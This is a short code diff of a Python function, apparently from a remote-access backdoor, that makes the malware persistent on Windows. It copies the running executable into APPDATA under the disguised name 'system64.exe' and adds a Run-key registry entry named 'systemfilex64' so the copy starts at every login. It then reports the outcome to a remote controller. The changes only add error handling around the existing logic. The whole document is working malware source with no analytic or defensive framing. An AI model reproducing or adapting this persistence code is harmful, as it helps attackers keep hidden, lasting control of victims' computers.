@@ -6,28 +6,32 @@ import sys
 
 
 def become_persistent(client):
+    try:
+        curr_executable = sys.executable
 
-    curr_executable = sys.executable
+        app_data = os.getenv("APPDATA")
+        to_save_file = app_data +"\\"+"system64.exe"
+        # display_msg("Current Executable: " + curr_executable, "y")
+        # display_msg("Saved Name: "+ to_save_file, "y")
 
-    app_data = os.getenv("APPDATA")
-    to_save_file = app_data +"\\"+"system64.exe"
 
-    if not os.path.exists(to_save_file):
-        display_msg("Becoming Persistent")
-        shutil.copyfile(curr_executable, to_save_file)
+        if not os.path.exists(to_save_file):
+            display_msg("Becoming Persistent")
+            shutil.copyfile(curr_executable, to_save_file)
 
-        key = winreg.HKEY_CURRENT_USER
+            key = winreg.HKEY_CURRENT_USER
 
-        # "Software\Microsoft\Windows\CurrentVersion\Run"
+            # "Software\Microsoft\Windows\CurrentVersion\Run"
 
-        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
-        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
+            key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
 
-        winreg.SetValueEx(key_obj, "system file", 0, winreg.REG_SZ, to_save_file)
+            winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
 
-        winreg.CloseKey(key_obj)
-        client.send_data("Successfuully Became Persistent")
-    else:
-        client.send_data("Already Persistent")
-    
+            winreg.CloseKey(key_obj)
+            client.send_data("Successfuully Became Persistent")
+        else:
+            client.send_data("Already Persistent")
+    except:
+        client.send_data("Some error occured")    
